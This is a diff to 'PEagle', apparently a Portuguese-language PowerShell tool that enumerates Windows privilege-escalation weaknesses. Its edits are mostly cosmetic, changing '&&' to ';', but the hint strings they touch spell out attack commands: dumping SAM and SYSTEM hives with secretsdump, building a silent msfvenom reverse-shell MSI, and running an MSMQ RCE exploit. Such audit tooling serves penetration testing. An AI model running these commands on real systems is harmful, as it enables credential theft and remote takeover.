@@ -1,4 +1,4 @@
-<#
+﻿<#
 .SYNOPSIS
     PEagle v2.1 — Enumeracao completa de Windows para Privilege Escalation
     Autossuficiente: zero dependencias externas. Apenas PowerShell 5.1+.
@@ -303,7 +303,7 @@ function Invoke-SystemChecks {
             $status = if ($_.Enabled) { "Ativo" } else { "Desabilitado" }
             $flag   = if ($_.PasswordNeverExpires) { " [SenhaNoExpira]" } else { "" }
             $admTag = if ($adm) { " [ADMIN]" } else { "" }
-            W-Data "$userName | $status$admTag$flag | LastLogon: $($_.LastLogon)"
+            W-Data "${userName} | ${status}${admTag}${flag} | LastLogon: $($_.LastLogon)"
         }
     } catch { W-Info "Erro usuarios: $_" }
 
@@ -340,7 +340,7 @@ function Invoke-SystemChecks {
             if ($r.IdentityReference -match "Users|Everyone|Authenticated" -and
                 $r.FileSystemRights -match "Read|FullControl") {
                 W-Crit "SAM legivel por $($r.IdentityReference)! CVE-2021-36934 (HiveNightmare)"
-                W-Data "reg save HKLM\SAM C:\Temp\sam.hive && reg save HKLM\SYSTEM C:\Temp\sys.hive"
+                W-Data "reg save HKLM\SAM C:\Temp\sam.hive ; reg save HKLM\SYSTEM C:\Temp\sys.hive"
                 W-Data "impacket-secretsdump -sam sam.hive -system sys.hive LOCAL"
             }
         }
@@ -801,7 +801,7 @@ function Invoke-ServicesChecks {
     try { $hkcu = (Get-ItemProperty "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -ErrorAction Stop).AlwaysInstallElevated } catch { $hkcu = 0 }
     if ($hklm -eq 1 -and $hkcu -eq 1) {
         W-Crit "AlwaysInstallElevated ATIVO — qualquer MSI roda como SYSTEM!"
-        W-Data "msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f msi > s.msi && msiexec /quiet /i s.msi"
+        W-Data "msfvenom -p windows/x64/shell_reverse_tcp LHOST=X LPORT=Y -f msi > s.msi ; msiexec /quiet /i s.msi"
     } elseif ($hklm -eq 1 -or $hkcu -eq 1) {
         W-Med "AlwaysInstallElevated parcial (HKLM=$hklm HKCU=$hkcu) — ambos precisam ser 1 para explorar"
     } else { W-Ok "AlwaysInstallElevated nao configurado" }
@@ -2057,7 +2057,7 @@ function Invoke-CVEChecks {
     if ($buildKnown -and $osBuild -ge 17763 -and $osBuild -le 22000) {
         if (-not $hkSet.Contains("KB5004569") -and -not $hkSet.Contains("KB5004570")) {
             W-Crit "CVE-2021-36934 (HiveNightmare/SeriousSAM) — Build $osBuild sem KB5004569 — SAM legivel por usuario comum"
-            W-Hint "reg save HKLM\SAM C:\Temp\sam.hive && reg save HKLM\SYSTEM C:\Temp\sys.hive && impacket-secretsdump -sam sam.hive -system sys.hive LOCAL"
+            W-Hint "reg save HKLM\SAM C:\Temp\sam.hive ; reg save HKLM\SYSTEM C:\Temp\sys.hive ; impacket-secretsdump -sam sam.hive -system sys.hive LOCAL"
         }
     }
     # CVE-2021-40449 (Win32k EoP — explorado pelo APT MysterySnail): builds < 22000
@@ -2104,7 +2104,7 @@ function Invoke-CVEChecks {
     $msmqSvc = try { Get-Service -Name MSMQ -ErrorAction Stop } catch { $null }
     if ($msmqSvc -and $msmqSvc.Status -eq "Running" -and $buildKnown -and -not $hkSet.Contains("KB5025221") -and -not $hkSet.Contains("KB5025224")) {
         W-Crit "CVE-2023-21554 (MSMQ QueueJumper RCE) — MSMQ rodando + KB5025221 ausente — RCE unauthenticated via porta 1801"
-        W-Hint "nc -zv <target> 1801  &&  python3 CVE-2023-21554.py <target>"
+        W-Hint "nc -zv <target> 1801  ;  python3 CVE-2023-21554.py <target>"
     }
 
     # ── 2024 ─────────────────────────────────────────────────────────────────
